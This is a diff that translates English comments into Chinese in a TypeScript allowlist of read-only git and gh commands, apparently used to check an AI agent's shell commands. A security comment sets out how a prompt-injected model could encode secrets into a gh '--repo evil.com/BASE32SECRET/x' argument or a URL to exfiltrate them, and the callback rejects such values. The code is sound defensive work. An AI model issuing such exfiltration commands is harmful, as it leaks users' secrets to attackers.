+      // `git tag --contains <ref>`（包含列表）。未带 -l/--list 的裸位置
+      // 参数会被当作待 CREATE 的 tag 名 — 危险。
       const flagsWithArgs = new Set([
         '--contains',
         '--no-contains',
@@ -762,17 +757,17 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
           i++
           continue
         }
-        // `--` ends flag parsing. All subsequent tokens are positional args,
-        // even if they start with `-`. `git tag -- -l` CREATES a tag named `-l`.
+        // `--` 结束 flag 解析。其后的所有 token 都是位置参数，即使以 `-`
+        // 开头。`git tag -- -l` 会创建一个名为 `-l` 的 tag。
         if (token === '--' && !seenDashDash) {
           seenDashDash = true
           i++
           continue
         }
         if (!seenDashDash && token.startsWith('-')) {
-          // Check for -l/--list (exact or in a bundle). `-li` bundles -l and
-          // -i — both 'none' type. Array.includes('-l') exact-matches, missing
-          // bundles like `-li`, `-il`. Check individual chars for short bundles.
+          // 检查 -l/--list（精确匹配或位于短 flag 组合中）。`-li` 是 -l 和
+          // -i 的组合 — 两者都是 'none' 类型。Array.includes('-l') 只做
+          // 精确匹配，会漏掉 `-li`、`-il` 这类组合。需要按字符检查短 flag 组合。
           if (token === '--list' || token === '-l') {
             seenListFlag = true
           } else if (
@@ -782,7 +777,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
             !token.includes('=') &&
             token.slice(1).includes('l')
           ) {
-            // Short-flag bundle like -li, -il containing 'l'
+            // 含有 'l' 的短 flag 组合，例如 -li、-il
             seenListFlag = true
           }
           if (token.includes('=')) {
@@ -793,10 +788,10 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
             i++
           }
         } else {
-          // Non-flag positional arg (or post-`--` positional). Safe only if
-          // preceded by -l/--list (then it's a pattern, not a tag name).
+          // 非 flag 位置参数（或 `--` 之后的位置参数）。只有先出现 -l/--list
+          // 时才安全（此时是 pattern，而非 tag 名）。
           if (!seenListFlag) {
-            return true // Positional arg without --list = tag creation
+            return true // 无 --list 的位置参数 = 创建 tag
           }
           i++
         }
@@ -806,7 +801,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git branch': {
     safeFlags: {
-      // List mode flags
+      // 列表模式 flag
       '-l': 'none',
       '--list': 'none',
       '-a': 'none',
@@ -816,54 +811,54 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-v': 'none',
       '-vv': 'none',
       '--verbose': 'none',
-      // Display options
+      // 展示选项
       '--color': 'none',
       '--no-color': 'none',
       '--column': 'none',
       '--no-column': 'none',
-      // SECURITY: --abbrev stays 'number' so validateFlags accepts --abbrev=N
-      // (attached form, safe). The DETACHED form `--abbrev N` is the bug:
-      // git uses PARSE_OPT_OPTARG (optional-attached only) — detached N becomes
-      // a POSITIONAL branch name, creating .git/refs/heads/N. validateFlags
-      // with 'number' consumes N, but the CALLBACK below catches it: --abbrev
-      // is NOT in callback's flagsWithArgs (removed), so callback sees N as a
-      // positional without list flag → dangerous. Two-layer defense: validate-
-      // Flags accepts both forms, callback blocks detached.
+      // 安全：--abbrev 保持 'number'，使 validateFlags 能接受 --abbrev=N
+      // （附带形式，安全）。分离形式 `--abbrev N` 才是 bug：git 使用
+      // PARSE_OPT_OPTARG（仅支持附带可选参数）— 分离的 N 会被当作位置
+      // 参数的分支名，从而创建 .git/refs/heads/N。validateFlags 用
+      // 'number' 会消费掉 N，但下方的 CALLBACK 会兜住它：--abbrev 不在
+      // callback 的 flagsWithArgs 中（已移除），所以 callback 把 N 当作
+      // 不带 list flag 的位置参数 → 判定为危险。两层防御：validateFlags
+      // 两种形式都接受，callback 拦截分离形式。
       '--abbrev': 'number',
       '--no-abbrev': 'none',
-      // Filtering - these take commit/ref arguments
+      // 过滤 - 这些 flag 接受 commit/ref 参数
       '--contains': 'string',
       '--no-contains': 'string',
-      '--merged': 'none', // Optional commit argument - handled in callback
-      '--no-merged': 'none', // Optional commit argument - handled in callback
+      '--merged': 'none', // 可选 commit 参数 - 在 callback 中处理
+      '--no-merged': 'none', // 可选 commit 参数 - 在 callback 中处理
       '--points-at': 'string',
-      // Sorting
+      // 排序
       '--sort': 'string',
-      // Note: --format is intentionally excluded as it could pose security risks
-      // Show current
+      // 注意：--format 被刻意排除，可能存在安全风险
+      // 展示当前分支
       '--show-current': 'none',
       '-i': 'none',
       '--ignore-case': 'none',
     },
-    // Block branch creation via positional arguments (e.g., "git branch newbranch")
-    // Flag validation is handled by safeFlags above
-    // args is tokens after "git branch"
+    // 拦截通过位置参数创建分支（例如 "git branch newbranch"）
+    // flag 校验由上方的 safeFlags 完成
+    // args 是 "git branch" 之后的 token
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Block branch creation: "git branch <name>" or "git branch <name> <start-point>"
-      // Only safe uses are: "git branch" (list), "git branch -flags" (list with options),
-      // or "git branch --contains/--merged/etc <ref>" (filtering)
-      // Flags that require an argument
+      // 拦截分支创建："git branch <name>" 或 "git branch <name> <start-point>"
+      // 只有以下用法是安全的："git branch"（列表）、"git branch -flags"（带选项的列表），
+      // 或 "git branch --contains/--merged/etc <ref>"（过滤）
+      // 需要参数的 flag
       const flagsWithArgs = new Set([
         '--contains',
         '--no-contains',
         '--points-at',
         '--sort',
-        // --abbrev REMOVED: git does NOT consume detached arg (PARSE_OPT_OPTARG)
+        // --abbrev 已移除：git 不会消费分离的参数（PARSE_OPT_OPTARG）
       ])
-      // Flags with optional arguments (don't require, but can take one)
+      // 带可选参数的 flag（不一定需要，但可以带）
       const flagsWithOptionalArgs = new Set(['--merged', '--no-merged'])
       let i = 0
       let lastFlag = ''
@@ -875,7 +870,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
           i++
           continue
         }
-        // `--` ends flag parsing. `git branch -- -l` CREATES a branch named `-l`.
+        // `--` 结束 flag 解析。`git branch -- -l` 会创建一个名为 `-l` 的分支。
         if (token === '--' && !seenDashDash) {
           seenDashDash = true
           lastFlag = ''
@@ -883,7 +878,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
           continue
         }
         if (!seenDashDash && token.startsWith('-')) {
-          // Check for -l/--list including short-flag bundles (-li, -la, etc.)
+          // 检查 -l/--list，包括短 flag 组合（-li、-la 等）
           if (token === '--list' || token === '-l') {
             seenListFlag = true
           } else if (
@@ -906,13 +901,13 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
             i++
           }
         } else {
-          // Non-flag argument (or post-`--` positional) - could be:
-          // 1. A branch name (dangerous - creates a branch)
-          // 2. A pattern after --list/-l (safe)
-          // 3. An optional argument after --merged/--no-merged (safe)
+          // 非 flag 参数（或 `--` 之后的位置参数）- 可能是：
+          // 1. 分支名（危险 - 会创建分支）
+          // 2. --list/-l 之后的 pattern（安全）
+          // 3. --merged/--no-merged 之后的可选参数（安全）
           const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag)
           if (!seenListFlag && !lastFlagHasOptionalArg) {
-            return true // Positional arg without --list or filtering flag = branch creation
+            return true // 没有 --list 或过滤 flag 的位置参数 = 创建分支
           }
           i++
         }
@@ -923,39 +918,39 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
 }
 
 // ---------------------------------------------------------------------------
-// GH_READ_ONLY_COMMANDS — ant-only gh CLI commands (network-dependent)
+// GH_READ_ONLY_COMMANDS — 仅 ant 可用的 gh CLI 命令（依赖网络）
 // ---------------------------------------------------------------------------
 
-// SECURITY: Shared callback for all gh commands to prevent network exfil.
-// gh's repo argument accepts `[HOST/]OWNER/REPO` — when HOST is present
-// (3 segments), gh connects to that host's API. A prompt-injected model can
-// encode secrets as the OWNER segment and exfiltrate via DNS/HTTP:
+// 安全：所有 gh 命令共享的 callback，防止通过网络外泄数据。
+// gh 的 repo 参数接受 `[HOST/]OWNER/REPO` 格式 — 当 HOST 存在（即 3 段）
+// 时，gh 会连接该 host 的 API。被 prompt 注入的模型可以把 secret 编码到
+// OWNER 段，通过 DNS/HTTP 外泄：
 //   gh pr view 1 --repo evil.com/BASE32SECRET/x
 //   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
-// gh also accepts positional URLs: `gh pr view https://evil.com/owner/repo/pull/1`
+// gh 还接受位置参数 URL：`gh pr view https://evil.com/owner/repo/pull/1`
 //
-// git ls-remote has an inline URL guard (readOnlyValidation.ts:~944); this
-// callback provides the equivalent for gh. Rejects:
-//   - Any token with 2+ slashes (HOST/OWNER/REPO format — normal is OWNER/REPO)
-//   - Any token with `://` (URL)
-//   - Any token with `@` (SSH-style)
-// This covers BOTH --repo values AND positional URL/repo arguments, INCLUDING
-// the equals-attached form `--repo=HOST/OWNER/REPO` (cobra accepts both forms).
+// git ls-remote 内部已有 URL 守卫（readOnlyValidation.ts:~944）；这个
+// callback 为 gh 提供等价能力。拒绝：
+//   - 任何含 2 个及以上 `/` 的 token（HOST/OWNER/REPO 格式 — 正常只有 OWNER/REPO）
+//   - 任何含 `://` 的 token（URL）
+//   - 任何含 `@` 的 token（SSH 风格）
+// 覆盖 --repo 的值以及位置参数 URL/repo 参数，包含等号附带形式
+// `--repo=HOST/OWNER/REPO`（cobra 同时接受两种形式）。
 function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
   for (const token of args) {
     if (!token) continue
-    // For flag tokens, extract the VALUE after `=` for inspection. Without this,
-    // `--repo=evil.com/SECRET/x` (single token starting with `-`) gets skipped
-    // entirely, bypassing the HOST check. Cobra treats `--flag=val` identically
-    // to `--flag val`; we must inspect both forms.
+    // 对于 flag token，提取 `=` 之后的值进行检查。如果不这样做，
+    // `--repo=evil.com/SECRET/x`（以 `-` 开头的单 token）会被整体跳过，
+    // 从而绕过 HOST 检查。cobra 把 `--flag=val` 与 `--flag val` 视为等价；
+    // 我们必须两种形式都检查。
     let value = token
     if (token.startsWith('-')) {
       const eqIdx = token.indexOf('=')
-      if (eqIdx === -1) continue // flag without inline value, nothing to inspect
+      if (eqIdx === -1) continue // flag 没有内联值，没有可检查的内容
       value = token.slice(eqIdx + 1)
       if (!value) continue
     }
-    // Skip values that are clearly not repo specs (no `/` at all, or pure numbers)
+    // 跳过明显不是 repo spec 的值（完全没有 `/`，或纯数字）
     if (
       !value.includes('/') &&
       !value.includes('://') &&
@@ -963,16 +958,16 @@ function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
     ) {
       continue
     }
-    // URL schemes: https://, http://, git://, ssh://
+    // URL scheme：https://、http://、git://、ssh://
     if (value.includes('://')) {
       return true
     }
-    // SSH-style: git@host:owner/repo
+    // SSH 风格：git@host:owner/repo
     if (value.includes('@')) {
       return true
     }
-    // 3+ segments = HOST/OWNER/REPO (normal gh format is OWNER/REPO, 1 slash)
-    // Count slashes: 2+ slashes means 3+ segments
+    // 3+ 段 = HOST/OWNER/REPO（gh 的常规格式是 OWNER/REPO，只有 1 个斜杠）
+    // 统计斜杠：2+ 个斜杠意味着 3+ 段
     const slashCount = (value.match(/\//g) || []).length
     if (slashCount >= 2) {
       return true
@@ -982,20 +977,20 @@ function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
 }
 
 export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
-  // gh pr view is read-only — displays pull request details
+  // gh pr view 是只读命令 — 显示 pull request 详情
   'gh pr view': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--comments': 'none', // Show comments
-      '--repo': 'string', // Target repository (OWNER/REPO)
+      '--json': 'string', // JSON 字段选择
+      '--comments': 'none', // 显示评论
+      '--repo': 'string', // 目标仓库（OWNER/REPO）
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr list is read-only — lists pull requests
+  // gh pr list 是只读命令 — 列出 pull request
   'gh pr list': {
     safeFlags: {
-      '--state': 'string', // open, closed, merged, all
+      '--state': 'string', // open、closed、merged、all
       '-s': 'string',
       '--author': 'string',
       '--assignee': 'string',
@@ -1013,7 +1008,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr diff is read-only — shows pull request diff
+  // gh pr diff 是只读命令 — 显示 pull request diff
   'gh pr diff': {
     safeFlags: {
       '--color': 'string',
@@ -1024,7 +1019,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr checks is read-only — shows CI status checks
+  // gh pr checks 是只读命令 — 显示 CI 状态检查
   'gh pr checks': {
     safeFlags: {
       '--watch': 'none',
@@ -1037,7 +1032,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue view is read-only — displays issue details
+  // gh issue view 是只读命令 — 显示 issue 详情
   'gh issue view': {
     safeFlags: {
       '--json': 'string',
@@ -1047,7 +1042,7 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue list is read-only — lists issues
+  // gh issue list 是只读命令 — 列出 issue
   'gh issue list': {
     safeFlags: {
       '--state': 'string',
@@ -1066,321 +1061,321 @@ export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh repo view is read-only — displays repository details
-  // NOTE: gh repo view uses a positional argument, not --repo/-R flags
+  // gh repo view 是只读命令 — 显示仓库详情
+  // 注意：gh repo view 使用位置参数，而不是 --repo/-R flag
   'gh repo view': {
     safeFlags: {
       '--json': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh run list is read-only — lists workflow runs
+  // gh run list 是只读命令 — 列出 workflow 运行记录
   'gh run list': {
     safeFlags: {
-      '--branch': 'string', // Filter by branch
+      '--branch': 'string', // 按分支过滤
       '-b': 'string',
-      '--status': 'string', // Filter by status
+      '--status': 'string', // 按状态过滤
       '-s': 'string',
-      '--workflow': 'string', // Filter by workflow
-      '-w': 'string', // NOTE: -w is --workflow here, NOT --web (gh run list has no --web)
-      '--limit': 'number', // Max results
+      '--workflow': 'string', // 按 workflow 过滤
+      '-w': 'string', // 注意：这里的 -w 是 --workflow，而不是 --web（gh run list 没有 --web）
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', // JSON 字段选择
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
-      '--event': 'string', // Filter by event type
+      '--event': 'string', // 按事件类型过滤
       '-e': 'string',
-      '--user': 'string', // Filter by user
+      '--user': 'string', // 按用户过滤
       '-u': 'string',
-      '--created': 'string', // Filter by creation date
-      '--commit': 'string', // Filter by commit SHA
+      '--created': 'string', // 按创建日期过滤
+      '--commit': 'string', // 按 commit SHA 过滤
       '-c': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh run view is read-only — displays a workflow run's details
+  // gh run view 是只读命令 — 显示某次 workflow 运行的详情
   'gh run view': {
     safeFlags: {
-      '--log': 'none', // Show full run log
-      '--log-failed': 'none', // Show log for failed steps only
-      '--exit-status': 'none', // Exit with run's status code
-      '--verbose': 'none', // Show job steps
-      '-v': 'none', // NOTE: -v is --verbose here, NOT --web
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--log': 'none', // 显示完整的运行日志
+      '--log-failed': 'none', // 只显示失败步骤的日志
+      '--exit-status': 'none', // 以运行的状态码退出
+      '--verbose': 'none', // 显示 job 步骤
+      '-v': 'none', // 注意：这里的 -v 是 --verbose，而不是 --web
+      '--json': 'string', // JSON 字段选择
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
-      '--job': 'string', // View a specific job by ID
+      '--job': 'string', // 查看指定 ID 的 job
       '-j': 'string',
-      '--attempt': 'number', // View a specific attempt
+      '--attempt': 'number', // 查看指定次数的尝试
       '-a': 'number',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh auth status is read-only — displays authentication state
-  // NOTE: --show-token/-t intentionally excluded (leaks secrets)
+  // gh auth status 是只读命令 — 显示认证状态
+  // 注意：刻意排除 --show-token/-t（会泄露密钥）
   'gh auth status': {
     safeFlags: {
-      '--active': 'none', // Display active account only
+      '--active': 'none', // 只显示当前激活的账号
       '-a': 'none',
-      '--hostname': 'string', // Check specific hostname
+      '--hostname': 'string', // 检查指定的 hostname
       '-h': 'string',
-      '--json': 'string', // JSON field selection
+      '--json': 'string', // JSON 字段选择
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh pr status is read-only — shows your PRs
+  // gh pr status 是只读命令 — 显示与你相关的 PR
   'gh pr status': {
     safeFlags: {
-      '--conflict-status': 'none', // Display merge conflict status
+      '--conflict-status': 'none', // 显示合并冲突状态
       '-c': 'none',
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', // JSON 字段选择
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh issue status is read-only — shows your issues
+  // gh issue status 是只读命令 — 显示与你相关的 issue
   'gh issue status': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', // JSON 字段选择
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh release list is read-only — lists releases
+  // gh release list 是只读命令 — 列出 release
   'gh release list': {
     safeFlags: {
-      '--exclude-drafts': 'none', // Exclude draft releases
-      '--exclude-pre-releases': 'none', // Exclude pre-releases
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--exclude-drafts': 'none', // 排除草稿 release
+      '--exclude-pre-releases': 'none', // 排除预发布
+      '--json': 'string', // JSON 字段选择
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--order': 'string', // Order: asc|desc
+      '--order': 'string', // 排序方向：asc|desc
       '-O': 'string',
-      '--repo': 'string', // Target repository
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh release view is read-only — displays release details
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh release view 是只读命令 — 显示 release 详情
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh release view': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--repo': 'string', // Target repository
+      '--json': 'string', // JSON 字段选择
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh workflow list is read-only — lists workflow files
+  // gh workflow list 是只读命令 — 列出 workflow 文件
   'gh workflow list': {
     safeFlags: {
-      '--all': 'none', // Include disabled workflows
+      '--all': 'none', // 包含已禁用的 workflow
       '-a': 'none',
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--json': 'string', // JSON 字段选择
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--repo': 'string', // Target repository
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh workflow view is read-only — displays workflow summary
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh workflow view 是只读命令 — 显示 workflow 概要
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh workflow view': {
     safeFlags: {
-      '--ref': 'string', // Branch/tag with workflow version
+      '--ref': 'string', // workflow 版本所在的分支/tag
       '-r': 'string',
-      '--yaml': 'none', // View workflow yaml
+      '--yaml': 'none', // 查看 workflow yaml
       '-y': 'none',
-      '--repo': 'string', // Target repository
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh label list is read-only — lists labels
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh label list 是只读命令 — 列出 label
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh label list': {
     safeFlags: {
-      '--json': 'string', // JSON field selection
-      '--limit': 'number', // Max results
+      '--json': 'string', // JSON 字段选择
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--order': 'string', // Order: asc|desc
-      '--search': 'string', // Search label names
+      '--order': 'string', // 排序方向：asc|desc
+      '--search': 'string', // 搜索 label 名
       '-S': 'string',
-      '--sort': 'string', // Sort: created|name
-      '--repo': 'string', // Target repository
+      '--sort': 'string', // 排序字段：created|name
+      '--repo': 'string', // 目标仓库
       '-R': 'string',
     },
     additionalCommandIsDangerousCallback: ghIsDangerousCallback,
   },
-  // gh search repos is read-only — searches repositories
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh search repos 是只读命令 — 搜索仓库
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh search repos': {
     safeFlags: {
-      '--archived': 'none', // Filter by archived state
-      '--created': 'string', // Filter by creation date
-      '--followers': 'string', // Filter by followers count
-      '--forks': 'string', // Filter by forks count
-      '--good-first-issues': 'string', // Filter by good first issues
-      '--help-wanted-issues': 'string', // Filter by help wanted issues
-      '--include-forks': 'string', // Include forks: false|true|only
-      '--json': 'string', // JSON field selection
-      '--language': 'string', // Filter by language
-      '--license': 'string', // Filter by license
-      '--limit': 'number', // Max results
+      '--archived': 'none', // 按归档状态过滤
+      '--created': 'string', // 按创建日期过滤
+      '--followers': 'string', // 按关注者数量过滤
+      '--forks': 'string', // 按 fork 数量过滤
+      '--good-first-issues': 'string', // 按 good first issues 过滤
+      '--help-wanted-issues': 'string', // 按 help wanted issues 过滤
+      '--include-forks': 'string', // 包含 fork：false|true|only
+      '--json': 'string', // JSON 字段选择
+      '--language': 'string', // 按语言过滤
+      '--license': 'string', // 按许可证过滤
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--match': 'string', // Restrict to field: name|description|readme
-      '--number-topics': 'string', // Filter by number of topics
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--size': 'string', // Filter by size range
-      '--sort': 'string', // Sort: forks|help-wanted-issues|stars|updated
-      '--stars': 'string', // Filter by stars
-      '--topic': 'string', // Filter by topic
-      '--updated': 'string', // Filter by update date
-      '--visibility': 'string', // Filter: public|private|internal
+      '--match': 'string', // 限定字段：name|description|readme
+      '--number-topics': 'string', // 按 topic 数量过滤
+      '--order': 'string', // 排序方向：asc|desc
+      '--owner': 'string', // 按 owner 过滤
+      '--size': 'string', // 按大小范围过滤
+      '--sort': 'string', // 排序字段：forks|help-wanted-issues|stars|updated
+      '--stars': 'string', // 按 star 数过滤
+      '--topic': 'string', // 按 topic 过滤
+      '--updated': 'string', // 按更新日期过滤
+      '--visibility': 'string', // 过滤：public|private|internal
     },
   },
-  // gh search issues is read-only — searches issues
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh search issues 是只读命令 — 搜索 issue
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh search issues': {
     safeFlags: {
-      '--app': 'string', // Filter by GitHub App author
-      '--assignee': 'string', // Filter by assignee
-      '--author': 'string', // Filter by author
-      '--closed': 'string', // Filter by closed date
-      '--commenter': 'string', // Filter by commenter
-      '--comments': 'string', // Filter by comment count
-      '--created': 'string', // Filter by creation date
-      '--include-prs': 'none', // Include PRs in results
-      '--interactions': 'string', // Filter by interactions count
-      '--involves': 'string', // Filter by involvement
-      '--json': 'string', // JSON field selection
-      '--label': 'string', // Filter by label
-      '--language': 'string', // Filter by language
-      '--limit': 'number', // Max results
+      '--app': 'string', // 按 GitHub App 作者过滤
+      '--assignee': 'string', // 按 assignee 过滤
+      '--author': 'string', // 按作者过滤
+      '--closed': 'string', // 按关闭日期过滤
+      '--commenter': 'string', // 按评论者过滤
+      '--comments': 'string', // 按评论数过滤
+      '--created': 'string', // 按创建日期过滤
+      '--include-prs': 'none', // 结果中包含 PR
+      '--interactions': 'string', // 按互动数过滤
+      '--involves': 'string', // 按参与人过滤
+      '--json': 'string', // JSON 字段选择
+      '--label': 'string', // 按 label 过滤
+      '--language': 'string', // 按语言过滤
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--locked': 'none', // Filter locked conversations
-      '--match': 'string', // Restrict to field: title|body|comments
-      '--mentions': 'string', // Filter by user mentions
-      '--milestone': 'string', // Filter by milestone
-      '--no-assignee': 'none', // Filter missing assignee
-      '--no-label': 'none', // Filter missing label
-      '--no-milestone': 'none', // Filter missing milestone
-      '--no-project': 'none', // Filter missing project
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--project': 'string', // Filter by project
-      '--reactions': 'string', // Filter by reaction count
-      '--repo': 'string', // Filter by repository
+      '--locked': 'none', // 过滤已锁定的对话
+      '--match': 'string', // 限定字段：title|body|comments
+      '--mentions': 'string', // 按 @mention 过滤
+      '--milestone': 'string', // 按 milestone 过滤
+      '--no-assignee': 'none', // 过滤无 assignee 的项
+      '--no-label': 'none', // 过滤无 label 的项
+      '--no-milestone': 'none', // 过滤无 milestone 的项
+      '--no-project': 'none', // 过滤无 project 的项
+      '--order': 'string', // 排序方向：asc|desc
+      '--owner': 'string', // 按 owner 过滤
+      '--project': 'string', // 按 project 过滤
+      '--reactions': 'string', // 按 reaction 数过滤
+      '--repo': 'string', // 按仓库过滤
       '-R': 'string',
-      '--sort': 'string', // Sort field
-      '--state': 'string', // Filter: open|closed
-      '--team-mentions': 'string', // Filter by team mentions
-      '--updated': 'string', // Filter by update date
-      '--visibility': 'string', // Filter: public|private|internal
+      '--sort': 'string', // 排序字段
+      '--state': 'string', // 过滤：open|closed
+      '--team-mentions': 'string', // 按 team mention 过滤
+      '--updated': 'string', // 按更新日期过滤
+      '--visibility': 'string', // 过滤：public|private|internal
     },
   },
-  // gh search prs is read-only — searches pull requests
-  // NOTE: --web/-w intentionally excluded (opens browser)
+  // gh search prs 是只读命令 — 搜索 pull request
+  // 注意：刻意排除 --web/-w（会打开浏览器）
   'gh search prs': {
     safeFlags: {
-      '--app': 'string', // Filter by GitHub App author
-      '--assignee': 'string', // Filter by assignee
-      '--author': 'string', // Filter by author
-      '--base': 'string', // Filter by base branch
+      '--app': 'string', // 按 GitHub App 作者过滤
+      '--assignee': 'string', // 按 assignee 过滤
+      '--author': 'string', // 按作者过滤
+      '--base': 'string', // 按 base 分支过滤
       '-B': 'string',
-      '--checks': 'string', // Filter by check status
-      '--closed': 'string', // Filter by closed date
-      '--commenter': 'string', // Filter by commenter
-      '--comments': 'string', // Filter by comment count
-      '--created': 'string', // Filter by creation date
-      '--draft': 'none', // Filter draft PRs
-      '--head': 'string', // Filter by head branch
+      '--checks': 'string', // 按 check 状态过滤
+      '--closed': 'string', // 按关闭日期过滤
+      '--commenter': 'string', // 按评论者过滤
+      '--comments': 'string', // 按评论数过滤
+      '--created': 'string', // 按创建日期过滤
+      '--draft': 'none', // 过滤草稿 PR
+      '--head': 'string', // 按 head 分支过滤
       '-H': 'string',
-      '--interactions': 'string', // Filter by interactions count
-      '--involves': 'string', // Filter by involvement
-      '--json': 'string', // JSON field selection
-      '--label': 'string', // Filter by label
-      '--language': 'string', // Filter by language
-      '--limit': 'number', // Max results
+      '--interactions': 'string', // 按互动数过滤
+      '--involves': 'string', // 按参与人过滤
+      '--json': 'string', // JSON 字段选择
+      '--label': 'string', // 按 label 过滤
+      '--language': 'string', // 按语言过滤
+      '--limit': 'number', // 最大结果数
       '-L': 'number',
-      '--locked': 'none', // Filter locked conversations
-      '--match': 'string', // Restrict to field: title|body|comments
-      '--mentions': 'string', // Filter by user mentions
-      '--merged': 'none', // Filter merged PRs
-      '--merged-at': 'string', // Filter by merge date
-      '--milestone': 'string', // Filter by milestone
-      '--no-assignee': 'none', // Filter missing assignee
-      '--no-label': 'none', // Filter missing label
-      '--no-milestone': 'none', // Filter missing milestone
-      '--no-project': 'none', // Filter missing project
-      '--order': 'string', // Order: asc|desc
-      '--owner': 'string', // Filter by owner
-      '--project': 'string', // Filter by project
-      '--reactions': 'string', // Filter by reaction count
-      '--repo': 'string', // Filter by repository
+      '--locked': 'none', // 过滤已锁定的对话
+      '--match': 'string', // 限定字段：title|body|comments
+      '--mentions': 'string', // 按 @mention 过滤
+      '--merged': 'none', // 过滤已合并的 PR
+      '--merged-at': 'string', // 按合并日期过滤
+      '--milestone': 'string', // 按 milestone 过滤
+      '--no-assignee': 'none', // 过滤无 assignee 的项
+      '--no-label': 'none', // 过滤无 label 的项
+      '--no-milestone': 'none', // 过滤无 milestone 的项
+      '--no-project': 'none', // 过滤无 project 的项
+      '--order': 'string', // 排序方向：asc|desc
+      '--owner': 'string', // 按 owner 过滤
+      '--project': 'string', // 按 project 过滤
+      '--reactions': 'string', // 按 reaction 数过滤
+      '--repo': 'string', // 按仓库过滤
       '-R': 'string',
-      '--review': 'string', // Filter by review status
-      '--review-requested': 'string', // Filter by review requested
-      '--reviewed-by': 'string', // Filter by reviewer
-      '--sort': 'string', // Sort field
-      '--state': 'string', // Filter: open|closed
-      '--team-mentions': 'string', // Filter by team mentions
-      '--updated': 'string', // Filter by update date
-      '--visibility': 'string', // Filter: public|private|internal
+      '--review': 'string', // 按 review 状态过滤
+      '--review-requested': 'string', // 按被请求 review 过滤
+      '--reviewed-by': 'string', // 按 reviewer 过滤
